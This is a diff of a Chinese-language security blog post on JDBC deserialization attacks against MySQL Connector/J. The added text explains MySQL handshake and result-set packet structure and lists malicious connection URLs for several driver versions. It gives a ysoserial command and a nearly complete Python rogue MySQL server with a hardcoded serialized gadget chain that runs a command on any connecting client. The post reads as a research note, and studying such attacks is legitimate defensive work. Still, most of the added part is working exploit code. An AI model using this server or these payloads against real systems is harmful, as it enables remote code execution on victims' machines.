@@ -76,7 +76,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDBC"><span class="toc-number">2.</span> <span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.</span> <span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95demo"><span class="toc-number">2.2.</span> <span class="toc-text">简单demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">Java序列化对象的标识符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC%E8%BF%9E%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">JDBC连接参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">readObject触发点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E8%AE%A4%E8%AF%81%E6%8A%A5%E6%96%87"><span class="toc-number">4.3.</span> <span class="toc-text">MySQL认证报文</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDBC"><span class="toc-number">2.</span> <span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.</span> <span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95demo"><span class="toc-number">2.2.</span> <span class="toc-text">简单demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="toc-number">3.</span> <span class="toc-text">Java序列化对象的标识符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC%E8%BF%9E%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">JDBC连接参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#readObject%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">readObject触发点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E8%AE%A4%E8%AF%81%E6%8A%A5%E6%96%87"><span class="toc-number">4.3.</span> <span class="toc-text">MySQL认证报文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show-session-status%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E7%BC%96%E5%86%99"><span class="toc-number">4.4.</span> <span class="toc-text">show session status响应包的编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">5.</span> <span class="toc-text">利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ServerStatusDiffInterceptor%E9%93%BE"><span class="toc-number">5.1.</span> <span class="toc-text">ServerStatusDiffInterceptor链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-0-7-8-0-20"><span class="toc-number">5.1.1.</span> <span class="toc-text">8.0.7-8.0.20</span></a></li></ol></li></ol></li></ol>
     </div>
   
         
@@ -248,7 +248,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #ff7d73">Java</a>
+                <a href="/blog/tags/Java/" style="color: #00a596">Java</a>
             </span>
             
             <span class="tag">
@@ -267,7 +267,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.7k字</span>
+        <span class="post-count">3k字</span>
       </span>
     </span>
 
@@ -276,7 +276,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">7分</span>
+        <span class="post-count">13分</span>
       </span>
     </span>
     
@@ -461,7 +461,191 @@
 
         <span class="token class-name">String</span> <span class="token constant">DB_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&amp;serverTimezone=GMT%2B8"</span><span class="token punctuation">;</span>
         <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">Driver</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"xxxxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token constant">DB_URL</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后抓包：因为使用的是本地的MYSQL，所以抓包需要使用<code>npcap</code>，wireshark默认使用的是<code>winpcap</code>，它不会抓取<code>本地环回</code>的数据包</p>
+<p>懒得配环境了，这里直接拿别的师傅的图（</p>
+<p>mysql也是有类似tcp一样的认证系统的，有Request和Response</p>
+<p>分析<code>Response OK</code>的数据包</p>
+<p><img src="/blog/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240530113241054.png" alt="image-20240530113241054"></p>
+<p>可以看到MYSQL Protocol的认证报文为：<code>0700000200000002000000</code></p>
+<p>也就是说我们恶意服务端只需要将该数据返回给Request即可完成认证，再看看Request报文：</p>
+<p><img src="/blog/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240530113435915.png" alt="image-20240530113435915"></p>
+<p>直接发送原始数据即可，恶意服务端可以将这部分改为恶意payload，之后进行反序列化</p>
+<hr>
+<h2 id="show-session-status响应包的编写"><a href="#show-session-status响应包的编写" class="headerlink" title="show session status响应包的编写"></a>show session status响应包的编写</h2><p>从流量中可以看出来<code>show session status</code>属于<strong>request Query</strong> 报文</p>
+<p>对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）</p>
+<p>流量里看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong></p>
+<p>我们这里要用的是<strong>结果集</strong>的数据包，结果集响应包的结构：</p>
+<p><img src="/blog/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240531005812275.png" alt="image-20240531005812275"></p>
+<ul>
+<li>数据段1：说明下面的结果集有多少列</li>
+<li>数据段2：列的定义</li>
+<li>数据段3：EOF 包</li>
+<li>数据段4：行数据</li>
+</ul>
+<p>那么对着这个数据段结构来构造自己的数据段：</p>
+<ol>
+<li><p>数据段1就可以写成<code>01 00 00 01 02</code> 前三字节表示数据长度为1，然后<code>sequence id</code>为1，最后一字节02表示有两列（尝试写一列无法正常运行）</p>
+</li>
+<li><p>数据段2用其它师傅已经写好的数据：<code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span>a <span class="token number">00</span> <span class="token number">00</span>  <span class="token comment">// 3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span>
+<span class="token number">02</span>      <span class="token comment">// 序号：这里是第二个数据字段</span>
+<span class="token number">03646566</span>  <span class="token comment">// def</span>
+<span class="token number">00</span>   <span class="token comment">// schema协议：因为不使用就用00</span>
+<span class="token number">01</span> <span class="token number">63</span>  <span class="token comment">// table：因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span>
+<span class="token number">01</span> <span class="token number">63</span>  <span class="token comment">// org_table：01表示1字节，63是数据</span>
+<span class="token number">0163</span>    <span class="token comment">// name  </span>
+<span class="token number">0163</span>   <span class="token comment">// org_name</span>
+<span class="token number">0</span>c      filler  <span class="token comment">// length of the following fields 总是0x0c</span>
+<span class="token number">3f</span><span class="token number">00</span>   <span class="token comment">// characterset：字符编码，003f是binary </span>
+ffff0000  column_length <span class="token comment">// 允许数据最大长度，就是我们行数据的最大长度。ffff</span>
+fc    <span class="token comment">// column_type：这一列数据类型，fc表示blob  </span>
+<span class="token number">9000</span>    <span class="token comment">// flags：9000是官方的值</span>
+<span class="token number">00</span>	<span class="token comment">// decimals</span>
+<span class="token number">0000</span>	<span class="token comment">// filler_2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>数据段3，EOF包貌似可以不用写</p>
+</li>
+<li><p>数据段4，即我们的poc，和上面一样，计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）。poc使用ysoserial</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar CommonsCollections7 <span class="token string">"calc"</span> <span class="token operator">></span> a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<hr>
+<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 5.1.0-5.1.10 连接后需执行查询</span>
+jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc
+
+
+<span class="token comment">// 5.1.11-5.x.xx</span>
+jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc
+
+<span class="token comment">// 6.x（注意包名中添加cj）</span>
+jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>statementInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>cj<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc
+
+<span class="token comment">// 8.0.20以下</span>
+jdbc<span class="token operator">:</span>mysql<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">3306</span><span class="token operator">/</span>test<span class="token operator">?</span>autoDeserialize<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>queryInterceptors<span class="token operator">=</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>mysql<span class="token punctuation">.</span>cj<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span></span>ServerStatusDiffInterceptor</span><span class="token operator">&amp;</span>user<span class="token operator">=</span>yso_JRE8u20_calc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><p>准备一个恶意mysql服务端</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>
+<span class="token comment">#@Time : 2020/7/27 2:10</span>
+<span class="token comment">#@Author: Tri0mphe7</span>
+<span class="token comment">#@File : server.py</span>
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> binascii
+<span class="token keyword">import</span> os
+
+greeting_data <span class="token operator">=</span> <span class="token string">"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"</span>
+response_ok_data <span class="token operator">=</span> <span class="token string">"0700000200000002000000"</span>
+
+
+<span class="token keyword">def</span> <span class="token function">receive_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Receiveing the package : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">send_data</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending the package : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">get_payload_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  "calc" > a</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">r'a'</span>
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            payload_content <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open successs"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"open false"</span><span class="token punctuation">)</span>
+        <span class="token comment">#calc</span>
+        payload_content <span class="token operator">=</span> <span class="token string">'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'</span>
+    <span class="token keyword">return</span> payload_content
+
+
+<span class="token comment"># 主要逻辑</span>
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connection come from &#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># 1.先发送第一个 问候报文</span>
+        send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> greeting_data<span class="token punctuation">)</span>
+
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            <span class="token comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
+            receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>
+
+            <span class="token comment">#其他过程</span>
+            data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            <span class="token comment">#查询一些配置信息,其中会发送自己的 版本号</span>
+            <span class="token keyword">if</span> <span class="token string">"session.auto_increment_increment"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                _payload <span class="token operator">=</span> <span class="token string">'01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            <span class="token keyword">elif</span> <span class="token string">"show warnings"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                _payload <span class="token operator">=</span> <span class="token string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> _payload<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"set names"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"set character_set_results"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> response_ok_data<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"show session status"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                mysql_data <span class="token operator">=</span> <span class="token string">'0100000102'</span>
+                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000002036465660001630163016301630c3f00ffff0000fc9000000000'</span>
+                mysql_data <span class="token operator">+=</span> <span class="token string">'1a000003036465660001630163016301630c3f00ffff0000fc9000000000'</span>
+                <span class="token comment"># 获取payload</span>
+                payload_content <span class="token operator">=</span> get_payload_content<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token comment"># 计算payload长度</span>
+                payload_length <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>
+                    <span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+                payload_length_hex <span class="token operator">=</span> payload_length<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> payload_length<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+                <span class="token comment"># 计算数据包长度</span>
+                data_len <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>
+                    <span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+                data_len_hex <span class="token operator">=</span> data_len<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> data_len<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+                mysql_data <span class="token operator">+=</span> data_len_hex <span class="token operator">+</span> <span class="token string">'04'</span> <span class="token operator">+</span> <span class="token string">'fbfc'</span> <span class="token operator">+</span> payload_length_hex
+                mysql_data <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>payload_content<span class="token punctuation">)</span>
+                mysql_data <span class="token operator">+=</span> <span class="token string">'07000005fe000022000100'</span>
+                send_data<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> mysql_data<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> receive_data<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>
